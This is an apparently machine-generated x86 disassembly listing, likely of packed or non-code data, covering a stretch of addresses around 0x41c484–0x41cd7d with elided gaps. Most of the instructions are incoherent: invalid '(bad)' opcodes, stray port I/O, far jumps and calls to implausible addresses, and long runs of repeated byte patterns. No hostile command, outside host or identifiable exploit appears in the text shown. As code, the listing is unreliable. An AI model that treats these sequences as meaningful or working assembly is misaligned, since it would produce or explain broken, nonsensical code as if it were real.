  41c484:	out    0x53,al
  41c486:	fdivr  QWORD PTR [ecx]
  41c488:	xlat   BYTE PTR ds:[ebx]
  41c489:	lods   al,BYTE PTR ds:[esi]
  41c48a:	int3   
  41c48b:	push   0x412fee
  41c490:	mov    ebx,0xd650d436
  41c495:	xchg   dl,cl
  41c497:	std    
  41c498:	mov    ecx,0xff74b44b
  41c49d:	cmp    DWORD PTR [esi+0x43],0xffffff96
  41c4a1:	xor    ebx,esp
  41c4a3:	sbb    eax,0x89ccd4a7
  41c4a8:	sti    
  41c4a9:	out    dx,eax
  41c4aa:	ja     0x41c4ef
	...
  41c4d4:	add    BYTE PTR [eax],al
  41c4d6:	mov    ?,edx
  41c4d8:	inc    ebp
  41c4d9:	cld    
  41c4da:	mov    bh,0x5e
  41c4dc:	aam    0x89
  41c4de:	jecxz  0x41c53a
  41c4e0:	pop    ebx
  41c4e1:	js     0x41c4e0
  41c4e3:	xor    BYTE PTR [eax+0x46],0x6a
  41c4e7:	jecxz  0x41c49d
  41c4e9:	fcmovnbe st,st(6)
  41c4eb:	or     dl,ah
  41c4ed:	inc    edx
  41c4ee:	ds loopne 0x41c49d
  41c4f1:	retf   
  41c4f2:	out    dx,al
  41c4f3:	add    BYTE PTR [eax-0x35],0x53
  41c4f7:	ins    DWORD PTR es:[edi],dx
  41c4f8:	mov    edi,0xe71bcd33
  41c4fd:	jle    0x41c4fc
  41c4ff:	push   0xffffffb7
  41c501:	(bad)  [edi]
  41c503:	je     0x41c523
  41c505:	int3   
  41c506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c507:	or     ebx,DWORD PTR [edx+eax*2-0x245b21c2]
  41c50e:	mov    es,WORD PTR [ebx+0x6d1bcb24]
  41c514:	xchg   ebp,eax
  41c515:	jle    0x41c594
  41c517:	jae    0x41c4b0
  41c519:	fcmovnb st,st(2)
  41c51b:	jae    0x41c50b
  41c51d:	retf   
  41c51e:	mov    ch,0x15
  41c520:	out    dx,eax
  41c521:	xor    eax,ebp
  41c523:	push   ss
  41c524:	xlat   BYTE PTR ds:[ebx]
  41c525:	xor    al,0xe6
  41c527:	in     al,0xce
  41c529:	retf   
  41c52a:	jmp    0x41c504
  41c52c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c52d:	hlt    
  41c52e:	mov    ebx,esi
  41c530:	sub    al,0xdc
  41c532:	outs   dx,BYTE PTR ds:[esi]
  41c533:	adc    DWORD PTR [ecx-0x34],0xffffffd3
  41c537:	ins    BYTE PTR es:[edi],dx
  41c538:	adc    eax,0x2f
	...
  41c561:	add    BYTE PTR [eax],al
  41c563:	add    cl,al
  41c565:	jg     0x41c573
  41c567:	(bad)  
  41c568:	ss pop ebx
  41c56a:	cmp    al,0x7d
  41c56c:	popf   
  41c56d:	fimul  DWORD PTR [ebx-0x18934e88]
  41c573:	adc    BYTE PTR ss:[edx+eiz*2],al
  41c577:	sub    DWORD PTR [esi],esi
  41c579:	loopne 0x41c577
  41c57b:	test   esp,0x93ca67d6
  41c581:	ins    BYTE PTR es:[edi],dx
  41c582:	add    BYTE PTR [ecx],bl
  41c584:	push   0x7
  41c586:	(bad)  
  41c587:	outs   dx,BYTE PTR ds:[esi]
  41c588:	jne    0x41c58b
  41c58a:	add    cl,dl
  41c58c:	lods   eax,DWORD PTR ds:[esi]
  41c58d:	call   0x74d7aed0
  41c592:	sti    
  41c593:	push   esi
  41c594:	jne    0x41c5d2
  41c596:	shl    BYTE PTR [ebx-0x48],cl
  41c599:	mov    esi,DWORD PTR [ebx-0x58]
  41c59c:	cmp    eax,0xfbfb04e3
  41c5a1:	fsqrt  
  41c5a3:	rol    DWORD PTR [ecx],1
  41c5a5:	jl     0x41c56c
  41c5a7:	fs repnz ins BYTE PTR es:[edi],dx
  41c5aa:	std    
  41c5ab:	es inc ebx
  41c5ad:	pop    ebx
  41c5ae:	add    cl,ch
  41c5b0:	adc    BYTE PTR [edi],al
  41c5b2:	xchg   DWORD PTR [ecx],ebx
  41c5b4:	stos   DWORD PTR es:[edi],eax
  41c5b5:	fdiv   DWORD PTR [edi+ecx*1-0xb]
  41c5b9:	ins    DWORD PTR es:[edi],dx
  41c5ba:	das    
  41c5bb:	sbb    edi,ecx
  41c5bd:	sub    cl,BYTE PTR [ecx-0x292919c]
  41c5c3:	test   BYTE PTR [edx+0xef7cd8],0x0
	...
  41c5f2:	hlt    
  41c5f3:	ins    DWORD PTR es:[edi],dx
  41c5f4:	std    
  41c5f5:	ins    BYTE PTR es:[edi],dx
  41c5f6:	mov    DWORD PTR [ebp-0x3],ebp
  41c5f9:	fidiv  WORD PTR [eax-0x20]
  41c5fc:	jl     0x41c5d5
  41c5fe:	hlt    
  41c5ff:	ins    DWORD PTR es:[edi],dx
  41c600:	or     eax,0xe0da388f
  41c605:	inc    esi
  41c606:	pop    ecx
  41c607:	mov    al,0x7c
  41c609:	mov    edi,0x7f0d6e04
  41c60e:	xor    al,0x3c
  41c610:	clc    
  41c611:	popa   
  41c612:	cmp    dl,BYTE PTR [ebp+0x1900e901]
  41c618:	and    DWORD PTR [ebx+0x6902f0a5],0xa7735b38
  41c622:	outs   dx,DWORD PTR ds:[esi]
  41c623:	add    eax,0xa14700e8
  41c628:	sti    
  41c629:	jmp    DWORD PTR [ebx+edi*4]
  41c62c:	js     0x41c62c
  41c62e:	adc    BYTE PTR [ecx+0x57cc8000],ah
  41c634:	jno    0x41c5dd
  41c636:	in     al,0xe2
  41c638:	js     0x41c638
  41c63a:	adc    BYTE PTR [ecx-0xd0e8b00],ah
  41c640:	add    BYTE PTR [eax+0x50fba0f1],0xef
  41c647:	mov    eax,ds:0x4110fff9
  41c64c:	pop    esi
  41c64d:	pop    ebx
  41c64e:	fiadd  WORD PTR [ebx+0x575fc259]
  41c654:	push   ecx
  41c655:	mov    DWORD PTR [eax],eax
	...
  41c67f:	add    BYTE PTR [edx+0x2e],cl
  41c682:	push   eax
  41c683:	push   ebx
  41c684:	jmp    0x9c4a1772
  41c689:	xor    ecx,DWORD PTR [ebx+ecx*4]
  41c68c:	retf   0x2e6e
  41c68f:	leave  
  41c690:	lea    ebp,[edx+0xe]
  41c693:	mov    bl,bl
  41c695:	arpl   bp,si
  41c697:	mov    bl,BYTE PTR [ebx]
  41c699:	jo     0x41c620
  41c69b:	add    al,0xee
  41c69d:	pop    ds
  41c69e:	jg     0x41c699
  41c6a0:	out    dx,eax
  41c6a1:	and    ch,cl
  41c6a3:	push   ebx
  41c6a4:	xor    eax,0x10faac87
  41c6a9:	xchg   ebp,eax
  41c6aa:	sub    eax,0x176382d2
  41c6af:	mov    ch,bl
  41c6b1:	push   eax
  41c6b2:	xor    al,BYTE PTR [ecx]
  41c6b4:	dec    edi
  41c6b5:	pop    esi
  41c6b6:	inc    edx
  41c6b7:	or     DWORD PTR [ebp-0x390f8699],0xffffffb0
  41c6be:	mov    al,BYTE PTR [edx+edi*4-0x6a]
  41c6c2:	mov    BYTE PTR [edx*4+0x3efa7f20],al
  41c6c9:	jl     0x41c710
  41c6cb:	icebp  
  41c6cc:	add    BYTE PTR ds:0xb5fbec79,ch
  41c6d2:	clc    
  41c6d3:	call   DWORD PTR [ecx+0x3e000174]
  41c6d9:	je     0x41c6dc
  41c6db:	add    BYTE PTR [esi],bh
  41c6dd:	je     0x41c6e0
  41c6df:	add    BYTE PTR [esi],bh
  41c6e1:	je     0x41c6e4
	...
  41c70b:	add    BYTE PTR [eax],al
  41c70d:	add    BYTE PTR [esi],bh
  41c70f:	je     0x41c712
  41c711:	add    BYTE PTR [esi],bh
  41c713:	je     0x41c716
  41c715:	add    BYTE PTR [esi],bh
  41c717:	je     0x41c71a
  41c719:	add    BYTE PTR [esi],bh
  41c71b:	je     0x41c71e
  41c71d:	add    BYTE PTR [esi],bh
  41c71f:	je     0x41c722
  41c721:	add    BYTE PTR [esi],bh
  41c723:	je     0x41c726
  41c725:	add    BYTE PTR [esi],bh
  41c727:	je     0x41c72a
  41c729:	add    BYTE PTR [esi],bh
  41c72b:	je     0x41c72e
  41c72d:	add    BYTE PTR [esi],bh
  41c72f:	je     0x41c732
  41c731:	add    BYTE PTR [esi],bh
  41c733:	je     0x41c736
  41c735:	add    BYTE PTR [esi],bh
  41c737:	je     0x41c73a
  41c739:	add    BYTE PTR [esi],bh
  41c73b:	je     0x41c73e
  41c73d:	add    BYTE PTR [esi],bh
  41c73f:	je     0x41c742
  41c741:	add    BYTE PTR [esi],bh
  41c743:	je     0x41c746
  41c745:	add    BYTE PTR [esi],bh
  41c747:	je     0x41c74a
  41c749:	add    BYTE PTR [esi],bh
  41c74b:	je     0x41c74e
  41c74d:	add    BYTE PTR [esi],bh
  41c74f:	je     0x41c752
  41c751:	add    BYTE PTR [esi],bh
  41c753:	je     0x41c756
  41c755:	add    BYTE PTR [esi],bh
  41c757:	je     0x41c75a
  41c759:	add    BYTE PTR [esi],bh
  41c75b:	je     0x41c75e
  41c75d:	add    BYTE PTR [esi],bh
  41c75f:	je     0x41c762
  41c761:	add    BYTE PTR [esi],bh
  41c763:	je     0x41c766
  41c765:	add    BYTE PTR [esi],bh
  41c767:	je     0x41c76a
  41c769:	add    BYTE PTR [esi],bh
  41c76b:	pop    ebx
  41c76c:	out    0x3,eax
  41c76e:	ds pop ebx
  41c770:	out    0x3,eax
	...
  41c79a:	add    BYTE PTR [eax],al
  41c79c:	ds pop ebx
  41c79e:	out    0x3,eax
  41c7a0:	ds pop ebx
  41c7a2:	out    0x3,eax
  41c7a4:	ds pop ebx
  41c7a6:	out    0x3,eax
  41c7a8:	ds pop ebx
  41c7aa:	out    0x3,eax
  41c7ac:	ds pop ebx
  41c7ae:	out    0x3,eax
  41c7b0:	ds pop ebx
  41c7b2:	out    0x3,eax
  41c7b4:	ds pop ebx
  41c7b6:	out    0x3,eax
  41c7b8:	ds pop ebx
  41c7ba:	out    0x3,eax
  41c7bc:	ds pop ebx
  41c7be:	out    0x3,eax
  41c7c0:	ds pop ebx
  41c7c2:	out    0x3,eax
  41c7c4:	ds pop ebx
  41c7c6:	out    0x3,eax
  41c7c8:	ds pop ebx
  41c7ca:	out    0x3,eax
  41c7cc:	ds pop ebx
  41c7ce:	out    0x3,eax
  41c7d0:	ds pop ebx
  41c7d2:	out    0x3,eax
  41c7d4:	ds pop ebx
  41c7d6:	out    0x3,eax
  41c7d8:	ds pop ebx
  41c7da:	out    0x3,eax
  41c7dc:	ds pop ebx
  41c7de:	in     al,0xfd
  41c7e0:	xor    al,0x55
  41c7e2:	mov    BYTE PTR [ebx],dh
  41c7e4:	mov    dh,dl
  41c7e6:	mov    BYTE PTR [ebx],ah
  41c7e8:	mov    BYTE PTR [edx],ch
  41c7ea:	int    0x13
  41c7ec:	pop    ecx
  41c7ed:	cmp    eax,edi
  41c7ef:	push   ss
  41c7f0:	pop    esi
  41c7f1:	cmp    esi,DWORD PTR [ebx+0x5b]
  41c7f4:	pop    ebp
  41c7f5:	cmp    ebx,DWORD PTR [edx+0x59]
  41c7f8:	xchg   ecx,eax
  41c7f9:	test   DWORD PTR [edx+0x61],0x5c5b3b6c
	...
  41c828:	add    BYTE PTR [eax],al
  41c82a:	pop    ebp
  41c82b:	cmp    ecx,DWORD PTR [ecx+0x61]
  41c82e:	push   edx
  41c82f:	out    dx,eax
  41c830:	dec    ebx
  41c831:	push   edx
  41c832:	push   ds
  41c833:	and    eax,0x1c37f910
  41c838:	add    BYTE PTR [esi+0x6a],al
  41c83b:	lock jno 0x41c87e
  41c83e:	sbb    ebx,esi
  41c840:	jae    0x41c80b
  41c842:	push   ebp
  41c843:	cli    
  41c844:	es leave 
  41c846:	push   edx
  41c847:	xor    BYTE PTR [edi],dh
  41c849:	rol    DWORD PTR [esi+0x2d],1
  41c84c:	xor    cl,bl
  41c84e:	dec    edx
  41c84f:	cmp    esp,DWORD PTR [edx+0x0]
  41c852:	pop    edx
  41c853:	adc    eax,0xfdec046d
  41c858:	bound  eax,QWORD PTR [edi]
  41c85a:	pop    edx
  41c85b:	and    BYTE PTR [edx-0x6],ah
  41c85e:	fdivp  st(0),st
  41c860:	sub    ecx,DWORD PTR [ecx]
  41c862:	sti    
  41c863:	imul   BYTE PTR [ebx+0x9]
  41c866:	sub    al,0x0
  41c868:	gs shl ecx,0xe9
  41c86c:	pop    ds
  41c86d:	mov    ebx,0xbb62e9de
  41c872:	add    edi,esp
  41c874:	arpl   WORD PTR [edi],cx
  41c876:	inc    edi
  41c877:	push   edx
  41c878:	or     esp,ebx
  41c87a:	push   es
  41c87b:	div    BYTE PTR [ecx-0x3c]
  41c87e:	pop    ebp
  41c87f:	add    BYTE PTR [esi-0x71],ch
  41c882:	mov    ch,ch
  41c884:	push   0xffffff88
  41c886:	jns    0x41c888
  41c888:	ins    DWORD PTR es:[edi],dx
  41c889:	xchg   DWORD PTR [edi],esi
  41c88b:	cmp    ebp,DWORD PTR [eax-0x6b]
	...
  41c8b6:	add    BYTE PTR [eax],al
  41c8b8:	mov    ebx,ebp
  41c8ba:	cmp    esi,edx
  41c8bc:	sub    dh,ch
  41c8be:	je     0x41c936
  41c8c0:	xor    eax,DWORD PTR [eax]
  41c8c2:	bound  edi,QWORD PTR [edx-0x62]
  41c8c5:	stc    
  41c8c6:	jo     0x41c946
  41c8c8:	fwait
  41c8c9:	out    dx,eax
  41c8ca:	je     0x41c914
  41c8cc:	mov    esp,?
  41c8ce:	sub    eax,0x2cf4914a
  41c8d3:	in     al,0xe7
  41c8d5:	push   esp
  41c8d6:	or     ch,cl
  41c8d8:	cmp    eax,0xe700005b
  41c8dd:	pop    ebx
  41c8de:	add    BYTE PTR [eax],al
  41c8e0:	xlat   BYTE PTR ds:[ebx]
  41c8e1:	pop    ebx
  41c8e2:	add    BYTE PTR [eax],al
  41c8e4:	xlat   BYTE PTR ds:[ebx]
  41c8e5:	pop    ebx
  41c8e6:	add    BYTE PTR [eax],al
  41c8e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8e9:	pop    ebx
  41c8ea:	add    BYTE PTR [eax],al
  41c8ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8ed:	pop    ebx
  41c8ee:	add    BYTE PTR [eax],al
  41c8f0:	xchg   edi,eax
  41c8f1:	pop    ebx
  41c8f2:	add    BYTE PTR [eax],al
  41c8f4:	xchg   edi,eax
  41c8f5:	pop    ebx
  41c8f6:	add    BYTE PTR [eax],al
  41c8f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8f9:	pop    ebx
  41c8fa:	add    BYTE PTR [eax],al
  41c8fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8fd:	pop    ebx
  41c8fe:	add    BYTE PTR [eax],al
  41c900:	xchg   edi,eax
  41c901:	pop    ebx
  41c902:	add    BYTE PTR [eax],al
  41c904:	xchg   edi,eax
  41c905:	pop    ebx
  41c906:	add    BYTE PTR [eax],al
  41c908:	addr16 pop ebx
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	addr16 pop ebx
  41c90e:	add    BYTE PTR [eax],al
  41c910:	push   edi
  41c911:	pop    ebx
  41c912:	add    BYTE PTR [eax],al
  41c914:	retf   0x4ed8
  41c917:	imul   esp,DWORD PTR [esi],0x3b
  41c91a:	sub    DWORD PTR [eax+eax*1],eax
	...
  41c945:	add    BYTE PTR [ecx],dl
  41c947:	mov    dh,0x54
  41c949:	in     al,dx
  41c94a:	sub    bh,BYTE PTR [edx-0x2587d29e]
  41c950:	pop    es
  41c951:	push   edi
  41c952:	cmp    ah,BYTE PTR [ebp+0x5]
  41c955:	adc    ebx,esp
  41c957:	ins    DWORD PTR es:[edi],dx
  41c958:	gs in  al,0xef
  41c95b:	adc    al,0x4f
  41c95d:	mov    ss,WORD PTR [edi]
  41c95f:	pop    ebx
  41c960:	add    BYTE PTR [eax],al
  41c962:	daa    
  41c963:	pop    ebx
  41c964:	add    BYTE PTR [eax],al
  41c966:	daa    
  41c967:	pop    ebx
  41c968:	add    BYTE PTR [eax],al
  41c96a:	pop    ss
  41c96b:	pop    ebx
  41c96c:	add    BYTE PTR [eax],al
  41c96e:	pop    ss
  41c96f:	pop    ebx
  41c970:	add    BYTE PTR [eax],al
  41c972:	out    0x5a,eax
  41c974:	add    BYTE PTR [eax],al
  41c976:	out    0x5a,eax
  41c978:	add    BYTE PTR [eax],al
  41c97a:	xlat   BYTE PTR ds:[ebx]
  41c97b:	pop    edx
  41c97c:	add    BYTE PTR [eax],al
  41c97e:	ds je  0x41c982
  41c981:	add    BYTE PTR [esi],bh
  41c983:	je     0x41c986
  41c985:	add    BYTE PTR [esi],bh
  41c987:	je     0x41c98a
  41c989:	add    BYTE PTR [esi],bh
  41c98b:	je     0x41c98e
  41c98d:	add    BYTE PTR [esi],bh
  41c98f:	je     0x41c992
  41c991:	add    BYTE PTR [esi],bh
  41c993:	je     0x41c996
  41c995:	add    BYTE PTR [esi],bh
  41c997:	je     0x41c99a
  41c999:	add    BYTE PTR [esi],bh
  41c99b:	je     0x41c99e
  41c99d:	add    BYTE PTR [esi],bh
  41c99f:	je     0x41c9a2
  41c9a1:	add    BYTE PTR [esi],bh
  41c9a3:	je     0x41c9a6
  41c9a5:	add    BYTE PTR [esi],bh
  41c9a7:	je     0x41c9aa
	...
  41c9d1:	add    BYTE PTR [eax],al
  41c9d3:	add    BYTE PTR [esi],bh
  41c9d5:	je     0x41c9d8
  41c9d7:	add    BYTE PTR [esi],bh
  41c9d9:	je     0x41c9dc
  41c9db:	add    BYTE PTR [esi],bh
  41c9dd:	je     0x41c9e0
  41c9df:	add    BYTE PTR [esi],bh
  41c9e1:	je     0x41c9e4
  41c9e3:	add    BYTE PTR [esi],bh
  41c9e5:	je     0x41c9e8
  41c9e7:	add    BYTE PTR [esi],bh
  41c9e9:	je     0x41c9ec
  41c9eb:	add    BYTE PTR [esi],bh
  41c9ed:	je     0x41c9f0
  41c9ef:	add    BYTE PTR [esi],bh
  41c9f1:	je     0x41c9f4
  41c9f3:	add    BYTE PTR [esi],bh
  41c9f5:	je     0x41c9f8
  41c9f7:	add    BYTE PTR [esi],bh
  41c9f9:	je     0x41c9fc
  41c9fb:	add    BYTE PTR [esi],bh
  41c9fd:	je     0x41ca00
  41c9ff:	add    BYTE PTR [esi],bh
  41ca01:	je     0x41ca04
  41ca03:	add    BYTE PTR [esi],bh
  41ca05:	je     0x41ca08
  41ca07:	add    BYTE PTR [esi],bh
  41ca09:	je     0x41ca0c
  41ca0b:	add    BYTE PTR [esi],bh
  41ca0d:	je     0x41ca10
  41ca0f:	add    BYTE PTR [esi],bh
  41ca11:	je     0x41ca14
  41ca13:	add    BYTE PTR [esi],bh
  41ca15:	je     0x41ca18
  41ca17:	add    BYTE PTR [esi],bh
  41ca19:	je     0x41ca1c
  41ca1b:	add    BYTE PTR [esi],bh
  41ca1d:	je     0x41ca20
  41ca1f:	add    BYTE PTR [esi],bh
  41ca21:	pop    ebx
  41ca22:	out    0x3,eax
  41ca24:	ds pop ebx
  41ca26:	out    0x3,eax
  41ca28:	ds pop ebx
  41ca2a:	out    0x3,eax
  41ca2c:	ds pop ebx
  41ca2e:	out    0x3,eax
  41ca30:	ds pop ebx
  41ca32:	out    0x3,eax
  41ca34:	ds pop ebx
  41ca36:	out    0x3,eax
	...
  41ca60:	add    BYTE PTR [eax],al
  41ca62:	ds pop ebx
  41ca64:	out    0x3,eax
  41ca66:	ds pop ebx
  41ca68:	out    0x3,eax
  41ca6a:	ds pop ebx
  41ca6c:	out    0x3,eax
  41ca6e:	ds pop ebx
  41ca70:	out    0x3,eax
  41ca72:	ds pop ebx
  41ca74:	out    0x3,eax
  41ca76:	ds pop ebx
  41ca78:	out    0x3,eax
  41ca7a:	ds pop ebx
  41ca7c:	out    0x3,eax
  41ca7e:	ds pop ebx
  41ca80:	out    0x3,eax
  41ca82:	ds pop ebx
  41ca84:	out    0x3,eax
  41ca86:	ds pop ebx
  41ca88:	out    0x3,eax
  41ca8a:	ds pop ebx
  41ca8c:	out    0x3,eax
  41ca8e:	ds pop ebx
  41ca90:	out    0x3,eax
  41ca92:	ds pop ebx
  41ca94:	out    0x3,eax
  41ca96:	ds pop ebx
  41ca98:	out    0x3,eax
  41ca9a:	ds pop ebx
  41ca9c:	out    0x3,eax
  41ca9e:	ds pop ebx
  41caa0:	out    0x3,eax
  41caa2:	ds pop ebx
  41caa4:	out    0x3,eax
  41caa6:	ds pop ebx
  41caa8:	out    0x3,eax
  41caaa:	ds pop ebx
  41caac:	out    0x3,eax
  41caae:	ds pop ebx
  41cab0:	out    0x3,eax
  41cab2:	ds pop ebx
  41cab4:	fcom   DWORD PTR [ecx]
  41cab6:	dec    edi
  41cab7:	das    
  41cab8:	aam    0xd
  41caba:	ds jmp 0x41ca44
  41cabd:	push   eax
  41cabe:	(bad)  
  41cabf:	in     al,dx
  41cac0:	lea    edx,[ecx-0x66]
  41cac3:	pop    ebx
  41cac4:	add    BYTE PTR [ecx+0x0],bh
	...
  41caef:	add    BYTE PTR [ebp+0x3d8b61eb],dl
  41caf5:	hlt    
  41caf6:	je     0x41cb44
  41caf8:	xor    bh,ch
  41cafa:	jbe    0x41cae5
  41cafc:	jmp    0x6764:0xd71d312a
  41cb03:	inc    esp
  41cb04:	or     eax,ebp
  41cb06:	jo     0x41caf1
  41cb08:	shr    BYTE PTR [edx],cl
  41cb0a:	xor    ebp,esi
  41cb0c:	(bad)  
  41cb0d:	cs xor eax,0x32343df1
  41cb13:	cli    
  41cb14:	test   eax,0x610b6064
  41cb19:	xor    al,0x32
  41cb1b:	fidivr DWORD PTR ds:0x4f1d62f7
  41cb21:	clc    
  41cb22:	data16 (bad) 
  41cb24:	cmp    eax,0x51fa62ef
  41cb29:	pop    ebx
  41cb2a:	ins    BYTE PTR es:[edi],dx
  41cb2b:	push   cs
  41cb2c:	inc    esp
  41cb2d:	clc    
  41cb2e:	push   DWORD PTR [edi-0x6ffd48d]
  41cb34:	sbb    ch,dl
  41cb36:	jo     0x41cb16
  41cb38:	sub    al,0xe9
  41cb3a:	arpl   WORD PTR [eax],bx
  41cb3c:	cmp    dh,bl
  41cb3e:	(bad)  
  41cb3f:	lds    ebp,FWORD PTR [ecx]
  41cb41:	idiv   bh
  41cb43:	mov    ebx,0xcc68f50c
  41cb48:	or     bl,BYTE PTR [ebx+0x64]
  41cb4b:	mov    ebx,0xc76cfe1a
  41cb50:	cmp    eax,0xb471ef
	...
  41cb7d:	add    BYTE PTR [eax-0x11],ch
  41cb80:	ins    DWORD PTR es:[edi],dx
  41cb81:	xchg   esi,eax
  41cb82:	xor    ah,BYTE PTR [eax+esi*1-0x28]
  41cb86:	sub    dh,BYTE PTR ds:0xfc3dd82f
  41cb8c:	imul   edi,DWORD PTR [esi+0x57],0xfffffff8
  41cb90:	jbe    0x41cb92
  41cb92:	mov    al,0x22
  41cb94:	add    BYTE PTR [ecx],dh
  41cb96:	lds    ebp,FWORD PTR [ecx+esi*1+0x35]
  41cb9a:	mov    ecx,0xbf72fd60
  41cb9f:	ds outs dx,DWORD PTR fs:[esi]
  41cba2:	mov    BYTE PTR [edi+0x2d],bl
  41cba5:	xor    al,BYTE PTR [ebx+eiz*2+0x32]
  41cba9:	cmp    BYTE PTR ss:[edi+0x36],ah
  41cbad:	add    BYTE PTR [edi+esi*1+0x23046972],al
  41cbb4:	add    BYTE PTR [ebx+0xa],dh
  41cbb7:	sub    DWORD PTR [edi+0x68],ebp
  41cbba:	(bad)  
  41cbbb:	sub    BYTE PTR [ecx+0x0],ah
  41cbbe:	jb     0x41cbfe
  41cbc0:	outs   dx,DWORD PTR ds:[esi]
  41cbc1:	je     0x41cbfd
  41cbc3:	sub    eax,0x2a306300
  41cbc8:	jo     0x41cc3f
  41cbca:	cmp    esi,DWORD PTR [edx]
  41cbcc:	jb     0x41cbce
  41cbce:	aaa    
  41cbcf:	sub    eax,0x32346e65
  41cbd4:	outs   dx,DWORD PTR ds:[esi]
  41cbd5:	jae    0x41cb6e
  41cbd7:	sub    esp,DWORD PTR [ebp+0x67]
  41cbda:	dec    eax
  41cbdb:	xor    dh,BYTE PTR [edx+0x0]
  41cbde:	cmp    DWORD PTR [eax],ebp
  41cbe0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x0
	...
  41cc09:	add    BYTE PTR [eax],al
  41cc0b:	add    BYTE PTR [ebp+0x3e],dh
  41cc0e:	ins    BYTE PTR es:[edi],dx
  41cc0f:	ins    BYTE PTR es:[edi],dx
  41cc10:	push   edi
  41cc11:	outs   dx,BYTE PTR ds:[esi]
  41cc13:	mov    dh,BYTE PTR [bp+di]
  41cc16:	add    BYTE PTR [edx+0x7a],ch
  41cc19:	sub    al,0x71
  41cc1b:	jae    0x41cc63
  41cc1d:	push   edi
  41cc1e:	sub    eax,0x2f6e4432
  41cc23:	xor    esp,DWORD PTR [edi]
  41cc25:	es push 0x7633eb61
  41cc2b:	lds    ebx,FWORD PTR gs:[esi+0x66]
  41cc2f:	jb     0x41cbeb
  41cc31:	xor    esp,DWORD PTR [edi+ebp*2+0x3e]
  41cc35:	xlat   BYTE PTR ds:[ebx]
  41cc36:	add    DWORD PTR [ecx-0x59],ebp
  41cc39:	loopne 0x41cc67
  41cc3b:	arpl   WORD PTR [esp+esi*2-0x25658edc],cx
  41cc42:	add    DWORD PTR [ecx+0x69],esi
  41cc45:	aad    0x26
  41cc47:	arpl   WORD PTR [esp+esi*2+0x36],bp
  41cc4b:	jae    0x41ccbb
  41cc4d:	(bad)  
  41cc4f:	imul   ebx,DWORD PTR [edi+0x12],0x4
  41cc53:	imul   esp,DWORD PTR [edi+0x15],0x2c
  41cc57:	pop    edi
  41cc58:	pop    ebx
  41cc59:	and    BYTE PTR [ecx+eiz*2],al
  41cc5c:	push   esi
  41cc5d:	(bad)  
  41cc5f:	jno    0x41ccbc
  41cc61:	je     0x41cc8d
  41cc63:	outs   dx,BYTE PTR ds:[esi]
  41cc64:	xor    cl,BYTE PTR [edi]
  41cc66:	outs   dx,BYTE PTR ss:[esi]
  41cc68:	sbb    ebp,DWORD PTR [eax]
  41cc6a:	add    al,0x6a
  41cc6c:	sbb    DWORD PTR [ebp+0x2c],eax
  41cc6f:	jae    0x41cc71
	...
  41cc99:	add    BYTE PTR [edi],bl
  41cc9b:	je     0x41ccc4
  41cc9d:	jae    0x41ccbc
  41cc9f:	pop    ebp
  41cca0:	cmp    DWORD PTR [ebp+0xb],ebp
  41cca3:	je     0x41ccc8
  41cca5:	ins    BYTE PTR es:[edi],dx
  41cca6:	and    esp,DWORD PTR [ebp+0x34]
  41cca9:	arpl   WORD PTR [edx],bx
  41ccab:	je     0x41ccd0
  41ccad:	pop    edi
  41ccae:	in     eax,dx
  41ccaf:	dec    esi
  41ccb0:	es pop edi
  41ccb2:	loop   0x41cd13
  41ccb4:	add    DWORD PTR [ecx-0xe],esi
  41ccb7:	xchg   edx,eax
  41ccb8:	xor    esi,DWORD PTR [ebp-0x21]
  41ccbb:	test   DWORD PTR [eax+eax*1],esi
  41ccbe:	push   cs
  41ccbf:	inc    esp
  41ccc0:	hlt    
  41ccc1:	das    
  41ccc2:	push   cs
  41ccc3:	inc    esp
  41ccc4:	add    al,0x70
  41ccc6:	shl    DWORD PTR [ebp+0x73db6c31],cl
  41cccc:	sub    ebp,DWORD PTR [ebp-0x54]
  41cccf:	nop
  41ccd0:	and    ch,BYTE PTR [esi+0x3e]
  41ccd3:	call   0x38f:0x5bb26722
  41ccda:	scas   eax,DWORD PTR es:[edi]
  41ccdb:	call   0xeddefb6b
  41cce0:	out    0x22,al
  41cce2:	(bad)  
  41cce3:	repz jp 0x41cd0c
  41cce6:	xchg   ecx,eax
  41cce7:	pop    ebx
  41cce8:	mov    DWORD PTR [esi],esi
  41ccea:	(bad)  
  41cceb:	out    0x83,eax
  41cced:	xor    eax,0x228bf33e
  41ccf2:	push   0x6e037cf8
  41ccf7:	clc    
  41ccf8:	push   esi
  41ccf9:	xor    al,0x5d
  41ccfb:	in     eax,dx
  41ccfc:	out    0xf8,al
	...
  41cd26:	add    BYTE PTR [eax],al
  41cd28:	adc    ch,BYTE PTR [edx]
  41cd2a:	push   ds
  41cd2b:	stc    
  41cd2c:	or     ch,BYTE PTR [edx]
  41cd2e:	out    0x2b,eax
  41cd30:	dec    ebp
  41cd31:	icebp  
  41cd32:	cmp    ah,BYTE PTR [edi]
  41cd34:	dec    esp
  41cd35:	pop    ebx
  41cd36:	dec    ebx
  41cd37:	xor    DWORD PTR [eax],esi
  41cd39:	clc    
  41cd3a:	inc    edx
  41cd3b:	cmp    edi,DWORD PTR [esi]
  41cd3d:	cld    
  41cd3e:	cmp    al,0x28
  41cd40:	sub    al,0xf8
  41cd42:	sbb    eax,0xdf32a04
  41cd47:	das    
  41cd48:	stc    
  41cd49:	in     eax,dx
  41cd4a:	out    0x22,al
  41cd4c:	and    dl,bh
  41cd4e:	add    esi,DWORD PTR [eax]
  41cd50:	cvtdq2ps xmm1,XMMWORD PTR [edx]
  41cd53:	sub    al,0xe1
  41cd55:	in     al,dx
  41cd56:	or     ch,BYTE PTR [ebx]
  41cd58:	fstp   QWORD PTR [edx+0xb]
  41cd5b:	and    esp,eax
  41cd5d:	repz add esi,DWORD PTR [eax]
  41cd60:	ds sub al,0x18
  41cd63:	repz adc BYTE PTR [ebx-0x2f],bl
  41cd67:	es call 0xdd6b8d5d
  41cd6d:	in     al,dx
  41cd6e:	out    0x34,al
  41cd70:	loope  0x41cd62
  41cd72:	int    0x2f
  41cd74:	fstp   QWORD PTR [edx-0x31]
  41cd77:	and    ch,BYTE PTR [eax+0x65c7fff1]
  41cd7d:	pop    ebx
